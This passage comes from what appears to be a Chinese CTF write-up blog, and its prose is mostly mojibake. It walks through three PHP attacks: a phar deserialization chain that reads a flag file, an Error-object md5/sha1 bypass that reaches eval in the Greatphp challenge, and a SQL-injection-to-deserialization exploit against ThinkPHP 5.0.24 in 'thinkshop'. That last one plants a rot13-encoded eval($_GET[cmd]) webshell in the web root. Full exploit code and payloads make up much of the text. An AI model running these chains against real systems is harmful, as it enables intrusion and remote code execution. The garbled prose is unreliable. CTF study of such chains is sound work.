<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pharååºåˆ—åŒ–</span><br><span class="line">åˆ©ç”¨è¿™ç§æ–¹æ³•å¯ä»¥åœ¨ä¸ä½¿ç”¨unserialize()å‡½æ•°çš„æƒ…å†µä¸‹è§¦å‘PHPååºåˆ—åŒ–æ¼æ´ã€‚æ¼æ´è§¦å‘æ˜¯åˆ©ç”¨Phar:// ä¼ªåè®®è¯»å–pharæ–‡ä»¶æ—¶ï¼Œä¼šååºåˆ—åŒ–meta-dataå‚¨å­˜çš„ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure>

<p>3.è¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šå…ˆè°ƒç”¨<code>__wakeup()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯æŸ¥çœ‹sourceæ˜¯å¦å«æœ‰<code>http|https|file:|gopher|dict</code>ï¼Œåªæœ‰ä¸å«æœ‰å°±ç›¸å½“äºæ²¡ç”¨ï¼Œç„¶åä¼šè‡ªåŠ¨è°ƒç”¨<code>__destruct()</code>æ–¹æ³•ï¼Œè®©str&#x3D;ä¸€ä¸ªå¯¹è±¡å°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>__toString()</code>å‡½æ•°ï¼Œç„¶åå†è·³åˆ°<code>__get()</code>æ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨file_get($value)ï¼Œæœ€åå°±å¯ä»¥æ‰“å¼€$valueçš„å†…å®¹ï¼Œåœ¨base.phpæ–‡ä»¶ä¸­çŸ¥é“äº†flagåœ¨f1ag.phpä¸­ï¼Œè®©$valueç­‰äºf1ag.phpå°±å¯ä»¥</p>
<p>4.æ„é€ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;<span class="comment">//ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸å¯ä»¥ç›´æ¥å†™/f1ag.php</span></span><br><span class="line"><span class="variable">$c</span>-&gt;str=<span class="variable">$s</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$t</span>;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>str[â€˜strâ€™]&#x3D;$tæ˜¯å› ä¸ºè¿™æ ·ç›¸å½“äºnew Test()-&gt;sourceï¼Œè€Œsourceåœ¨Testç±»ä¸­ä¸å­˜åœ¨å°±ä¼šè°ƒç”¨<code>__get()</code></p>
<p>params[â€˜sourceâ€™]ä¸­çš„$keyæ˜¯sourceæ˜¯å› ä¸ºä½¿ç”¨ä»<code>__tostring</code>è°ƒåˆ°<code>__get</code>æ˜¯å› ä¸ºnew Test()-&gt;sourceï¼Œæ‰€ä»¥__get($key)ä¸­çš„keyè‡ªåŠ¨ä¸ºsource</p>
<p>$value &#x3D; $this-&gt;params[$key]ä¼šå°†params[$key]çš„é”®å€¼èµ‹ç»™$valueï¼Œæ‰€ä»¥è®©params[$key]ç­‰äº&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php</p>
<p>è€Œä¸‹é¢è¿™äº›æ˜¯æ„æˆpharæ–‡ä»¶çš„æ¡†æ¶ï¼Œæ²¡çœ‹æ‡‚ï¼Œç›´æ¥æ¬è¿‡æ¥çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($c);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>5.åœ¨burpå°†ç”Ÿæˆçš„phar.pharæ–‡ä»¶ä¸Šä¼ åˆ°è¯¥é¢˜çš„ç½‘é¡µä¸Šï¼Œç„¶åæŠ“åŒ…ï¼Œè¿˜å¾—å°†phar.pharæ”¹ä¸º.jpgåç¼€ï¼Œå¹¶ä¸”ä¿®æ”¹Content-Dispositionæ”¹ä¸ºimage&#x2F;jpegï¼Œç„¶åä¸Šä¼ ï¼Œåœ¨è¯¥é¢˜urlè¡Œè¾“å…¥<code>http://45a56e8f-0f38-4980-9f82-e1c628c3782f.node4.buuoj.cn:81/upload</code>å¯ä»¥æŸ¥çœ‹ä¸Šä¼ ä¸Šå»çš„æ–‡ä»¶ï¼Œå‘ç°æ–‡ä»¶ä¸º42574e9d70ad4a54c530fd9a294a46dc.jpg</p>
<p>6.ç„¶ååœ¨æŸ¥çœ‹æ–‡ä»¶é¡µçš„urlè¡Œè¾“å…¥<code>http://2aa7556c-ed4c-4917-91b4-b7c2c8480eef.node4.buuoj.cn:81/file.php?file=phar:///var/www/html/upload/42574e9d70ad4a54c530fd9a294a46dc.jpg</code>ï¼Œå‘ç°å¾—åˆ°äº†base64ç¼–ç çš„ä¸€ä¸²ä¸œè¥¿ï¼Œæœ€åè§£ç ï¼Œå¾—åˆ°flag</p>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h3><p>1.æ‰“å¼€æ˜¾ç¤ºæºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class="line">           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class="line">               eval($this-&gt;syc);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               die(&quot;Try Hard !!&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2.å…ˆå¯¹æºç è¿›è¡Œåˆ†æï¼Œå¯ä»¥åˆ©ç”¨çš„æ˜¯greatï¼Œç„¶åå°†å…¶ååºåˆ—åŒ–ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨__wakeup()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¦‚æœsycå’Œloverçš„å€¼ä¸åŒï¼Œå¹¶ä¸”md5å’Œsha1éƒ½ç›¸åŒï¼Œä¼šè¿›å…¥ä¸‹ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœsycé‡Œæ²¡æœ‰<code>/\&lt;\?php|\(|\)|\&quot;|\&#39;/</code>ï¼Œå°±ä¼šä½¿ç”¨eval($this-&gt;syc);</p>
<p>3.æ€è·¯æ˜¯æˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™äº›åˆ¤æ–­åˆ°è¾¾eval($this-&gt;syc);</p>
<p>eval() å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§ PHP ä»£ç æ¥è®¡ç®—ï¼Œåªéœ€è¦è®©sycç­‰äºèƒ½å°†æ–‡ä»¶å†…å®¹è¿”å›çš„å‡½æ•°å³å¯ï¼Œä½†æœ‰()è¿‡æ»¤æ‰€ä»¥ä½¿ç”¨include â€œ&#x2F;flagâ€ï¼Œä½†åˆæœ‰å¼•å·è¿‡æ»¤ï¼Œå°±ä½¿ç”¨urlå–åç»•è¿‡</p>
<p>4.æ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘æ€ä¹ˆç»•è¿‡<code>if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )</code>ä½¿ç”¨åŸç”Ÿç±»error</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new Error($str,1);$b=new Error($str,2);//å¿…é¡»åœ¨åŒä¸€è¡Œ</span><br><span class="line">echo $a;</span><br><span class="line">echo $b;</span><br><span class="line">ä»–ä»¬è¾“å‡ºçš„ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œä½†å†…å®¹ä¸ä¸€æ ·ï¼Œè¿™æ ·å°±å¯ä»¥è¯´ç»•è¿‡è¿™äº›æ¯”è¾ƒ</span><br></pre></td></tr></table></figure>

<p>5.æ„é€ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SYCLOVER</span><br><span class="line">&#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line">&#125;</span><br><span class="line">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</span><br><span class="line">$a=new Error($str,1);$b=new Error($str,2);</span><br><span class="line">$s=new SYCLOVER();</span><br><span class="line">$s-&gt;syc=$a;</span><br><span class="line">$s-&gt;lover=$b;</span><br><span class="line">echo(urlencode(serialize($s)));</span><br></pre></td></tr></table></figure>

<p><code>$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</code>è¿™é‡Œçš„%D0%99%93%9E%98æ˜¯æ‰§è¡Œ<code>echo(urlencode(~&quot;/flag&quot;));</code>è¿™ä¸ªçš„è¾“å‡ºï¼Œè¿›è¡Œ&#x2F;flagçš„å–åï¼Œ<code>include~.urldecode(&quot;%D0%99%93%9E%98&quot;)</code>ç›¸å½“äºå†å¯¹<code>urldecode(&quot;%D0%99%93%9E%98&quot;)</code>å–åï¼Œä¼šè¾“å‡ºåŸæ¥çš„å¥å­ï¼Œæ¯”å¦‚<code>echo &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</code>ä¼šè¾“å‡º<code>?&gt;&lt;?=include~Ğ™ï¿½ï¿½ï¿½?&gt;</code>å¦‚æœç»è¿‡evalçš„ä½¿ç”¨ï¼Œå°±ç›¸å½“äºä½¿ç”¨include â€œ&#x2F;flagâ€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œ $str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;è¦åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ª ?&gt; å› ä¸ºError çš„ __toString æ–¹æ³•åœ¨eval()å‡½æ•°ä¸­è¾“å‡ºçš„ç»“æœæ˜¯ä¸å¯èƒ½æ§çš„ï¼Œå³è¾“å‡ºçš„æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œpayloadå‰é¢è¿˜æœ‰ä¸€æ®µä¿¡æ¯â€œError: â€ï¼šæ¥å‰é¢çš„é—­åˆä¸€ä¸‹</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>thinkshop(å¼ºç½‘æ¯ 2023)</title>
    <url>/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/</url>
    <content><![CDATA[<p>thinkshop</p>
<p>Thinkphp 5.0.24 ååºåˆ—åŒ–ï¼ˆä»»æ„æ–‡ä»¶å†™å…¥ï¼‰æ¼æ´</p>
<span id="more"></span>

<meta name="referrer" content="no-referrer">

<h3 id="thinkshop"><a href="#thinkshop" class="headerlink" title="thinkshop"></a>thinkshop</h3><p>å¤ç°</p>
<p>dockerï¼š[æºç ](C:\Users\AtOnce\Desktop\å¹³å¹³æ— å¥‡\WEB\æ¯”èµ›æºç \å¼ºç½‘æ¯ 2023\thinkshop)</p>
<p>thinkphpæºç ï¼š<a href="https://gitee.com/emmm159/images/blob/master/source/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/html.zip">æºç </a></p>
<p>çŸ¥è¯†ç‚¹ï¼š</p>
<ul>
<li>Thinkphp 5.0.24 ååºåˆ—åŒ–ï¼ˆä»»æ„æ–‡ä»¶å†™å…¥ï¼‰æ¼æ´</li>
</ul>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</a></p>
<p>æ‰“å¼€åçš„é¦–é¡µï¼Œé¦–é¡µä»€ä¹ˆä¿¡æ¯éƒ½æ²¡æœ‰ï¼Œåªæœ‰ä¸€ä¸ªfake_flagæŸ¥çœ‹è¯¦æƒ…é‡Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆä¿¡æ¯</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218160927711.png" alt="image-20231218160927711"></p>
<p>ç›´æ¥çœ‹æºç </p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218161045651.png" alt="image-20231218161045651"></p>
<p>è¿™äº›éƒ½æ˜¯ä¸»è¦æ–‡ä»¶ï¼Œå…ˆéšä¾¿çœ‹ä¸€ä¸ªhtmlé¡µé¢ï¼Œå‘ç°éœ€è¦ç™»å½•</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162204570.png" alt="image-20231218162204570"></p>
<p>è¿™é‡Œç™»å½•çš„åç«¯æ˜¯Admin.phpä¸­çš„do_login()æ–¹æ³•</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162312003.png" alt="image-20231218162312003"></p>
<p>éœ€è¦æ»¡è¶³è¾“å…¥çš„å¯†ç ç»è¿‡md5ç­‰äºadminæ•°æ®è¡¨ä¸­çš„passwordå­—æ®µå†…å®¹</p>
<p>è¿™é‡Œå¯ä»¥å»æŸ¥çœ‹dockerä¸­çš„æ•°æ®åº“</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162424479.png" alt="image-20231218162424479"></p>
<p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·æ°‘å’Œå¯†ç ï¼Œå¯†ç ç»è¿‡çˆ†ç ´è§£ç æ˜¯123456</p>
<p>ä½†æ˜¯ç™»å½•ä½¿ç”¨çš„ç”¨æˆ·åä¸èƒ½ç”¨adminï¼Œåªèƒ½ä½¿ç”¨1ï¼Œå¦åˆ™ä¼šæ˜¾ç¤ºç”¨æˆ·åæˆ–å¯†ç é”™è¯¯</p>
<p>ç™»å½•åå°±å¤šå‡ºäº†ä¸¤ä¸ªåŠŸèƒ½ï¼Œæ·»åŠ å•†å“å’Œè¿›å…¥ä¿®æ”¹</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162553626.png" alt="image-20231218162553626"></p>
<p>ç»§ç»­çœ‹æºç ï¼Œå¯ä»¥åœ¨æºç ä¸­æ‰¾åˆ°éå¸¸å¥‡æ€ªçš„åœ°æ–¹</p>
<p>ä¸€ä¸ªæ˜¯goods_edit.htmlä¸­æœ‰ååºåˆ—åŒ–å‡½æ•°</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162738537.png" alt="image-20231218162738537"></p>
<p>è¿™é‡Œçš„ä½œç”¨å°±æ˜¯è¿›è¡Œä¿®æ”¹æ—¶ä¼šå°†åŸæ¥çš„å†…å®¹å…ˆè¿”å›</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162902309.png" alt="image-20231218162902309"></p>
<p>è¿˜æœ‰ä¸€ä¸ªå°±æ˜¯goods.htmlä¸­ä¹Ÿæœ‰ä¸€ä¸ªååºåˆ—åŒ–å‡½æ•°</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162814328.png" alt="image-20231218162814328"></p>
<p>è¿™é‡Œçš„ä½œç”¨å°±æ˜¯åœ¨éç®¡ç†å‘˜ç”¨æˆ·é¡µé¢çš„æŸ¥çœ‹è¯¦æƒ…é‚£é‡Œï¼Œç‚¹å‡»åä¼šå°†æ•°æ®åº“ä¸­çš„å†…å®¹è¿›è¡Œè§£ç å¹¶ååºåˆ—åŒ–ä¼šè¿”å›åˆ°ç½‘é¡µä¸­</p>
<p>æ—¢ç„¶æœ‰ååºåˆ—åŒ–å‡½æ•°äº†ï¼Œé‚£å°±çœ‹è¿™é‡Œèƒ½ä¸èƒ½æ§åˆ¶ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶å°±å¯ä»¥ä½¿ç”¨Thinkphp 5.0.24 ååºåˆ—åŒ–ï¼ˆä»»æ„æ–‡ä»¶å†™å…¥ï¼‰æ¼æ´</p>
<p>å…ˆæ¥çœ‹dataæ•°æ®æ¥è‡ªå“ªé‡Œï¼Œç¼–è¾‘é¡µé¢ä½¿ç”¨äº†do_editå‡½æ•°è¿›è¡Œç¼–è¾‘ï¼Œçœ‹è¿™ä¸ªæ–¹æ³•è¿›è¡Œäº†ä»€ä¹ˆ</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163250760.png" alt="image-20231218163250760"></p>
<p>ç»§ç»­è·Ÿè¿›</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163342381.png" alt="image-20231218163342381"></p>
<p>è·Ÿè¿›</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163510964.png" alt="image-20231218163510964"></p>
<p>ç»§ç»­æŸ¥çœ‹</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163526322.png" alt="image-20231218163526322"></p>
<p>çœ‹åˆ°è¿™é‡Œæœ‰sqlè¯­å¥æ‹¼æ¥ï¼Œå…¶ä¸­çš„$dataå¯ä»¥é€šè¿‡postä¼ å…¥</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163824248.png" alt="image-20231218163824248"></p>
<p>è¿™æ ·ä¼ å…¥ï¼Œsqlæ‹¼æ¥åè¯­å¥æ˜¯ä»¥ä¸‹å›¾ä¸­å†…å®¹</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163844583.png" alt="image-20231218163844583"></p>
<p>å¯ä»¥çœ‹åˆ°å…¶å®postçš„å‚æ•°å°±æ˜¯$keyï¼Œè€Œå€¼å°±æ˜¯$value</p>
<p>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡æ‹¼æ¥æ¼æ´æ§åˆ¶dataå†…å®¹äº†ï¼Œä¹‹ååªéœ€è¦é€šè¿‡æŸ¥çœ‹è¯¦æƒ…çš„ååºåˆ—åŒ–å‡½æ•°å³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ å¦‚ä½•æ‹¼æ¥æ‰èƒ½æ§åˆ¶</p>
<p>éœ€è¦æ§åˆ¶$keyå¤„ï¼Œé‚£ä¹ˆå°±æ˜¯ä¿®æ”¹postå‚æ•°</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&amp;name=sss&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dunhex(%2731%27)/**/WHERE/**/`id`/**/%3d/**/3#=1 &amp;data=1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218164347802.png" alt="image-20231218164347802"></p>
<p>ç»è¿‡äº•å·å°†åé¢å†…å®¹æ³¨é‡Šåå°±å˜æˆäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE goods SET `id` = unhex(&#x27;32&#x27;), `name` = unhex(&#x27;737373&#x27;), `price` = unhex(&#x27;3130302e3030&#x27;), `on_sale_time` = unhex(&#x27;323032332d30352d30355430323a32303a3534&#x27;), `image` = unhex(&#x27;68747470733a2f2f692e706f7374696d672e63632f467a764e464247382f522d362d4849332d594b522d55462d4a47302d472d4e2e6a7067&#x27;), `data`=unhex(&#x27;31&#x27;)/**/WHERE/**/`id`/**/=/**/3#</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±æˆåŠŸæ§åˆ¶äº†dataå†…å®¹</p>
<p>ç„¶åå°±æ˜¯ä½¿ç”¨pocæ„é€ payloadäº†</p>
<p>ä½†æ˜¯è¿˜éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å†™å…¥æ–‡ä»¶çš„ç›®å½•ï¼Œä¸€èˆ¬éƒ½æ˜¯åœ¨tmpç›®å½•ä¸‹ï¼Œè¿™é‡Œå¯»æ‰¾åˆ°&#x2F;runtime&#x2F;tempï¼Œä¹Ÿæœ‰å†™å…¥æƒé™</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218164613585.png" alt="image-20231218164613585"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Pipes&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Windows extends Pipes&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;files = [new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;#Relation</span><br><span class="line">use think\db\Query;</span><br><span class="line">abstract class Relation&#123;</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;selfRelation = false;</span><br><span class="line">        $this-&gt;query = new Query();#class Query</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;#OneToOne HasOne</span><br><span class="line">use think\model\Relation;</span><br><span class="line">abstract class OneToOne extends Relation&#123;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class HasOne extends OneToOne&#123;</span><br><span class="line">    protected $bindAttr = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;#Output</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line">class Output&#123;</span><br><span class="line">    private $handle = null;</span><br><span class="line">    protected $styles = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;handle = new Memcached();//ç›®çš„è°ƒç”¨å…¶write()</span><br><span class="line">        $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;#Model</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line">use think\console\Output;</span><br><span class="line">use think\db\Query;</span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    protected $error;</span><br><span class="line">    public $parent;#ä¿®æ”¹å¤„</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line">    protected $aaaaa;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;parent = new Output();#Outputå¯¹è±¡,ç›®çš„æ˜¯è°ƒç”¨__call()</span><br><span class="line">        $this-&gt;append = [&#x27;getError&#x27;];</span><br><span class="line">        $this-&gt;error = new HasOne();//Relationå­ç±»,ä¸”æœ‰getBindAttr()</span><br><span class="line">        $this-&gt;selfRelation = false;//isSelfRelation()</span><br><span class="line">        $this-&gt;query = new Query();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db;#Query</span><br><span class="line">use think\console\Output;</span><br><span class="line">class Query&#123;</span><br><span class="line">    protected $model;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;model = new Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;#Memcached</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line">class Memcached&#123;</span><br><span class="line">    protected $handler = null;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;handler = new File();//ç›®çš„è°ƒç”¨File-&gt;set()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\cache\driver;#File</span><br><span class="line">class File&#123;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    protected $tag;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27;        =&gt; 0,</span><br><span class="line">            &#x27;cache_subdir&#x27;  =&gt; false,</span><br><span class="line">            &#x27;prefix&#x27;        =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;path&#x27;          =&gt; &#x27;php://filter/write=string.rot13/resource=/var/www/html/runtime/temp/&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;tag = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">use think\Model;</span><br><span class="line">class Pivot extends Model&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br></pre></td></tr></table></figure>

<p>å°†ç”Ÿæˆçš„æ•°æ®è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç </p>
<p>payload</p>
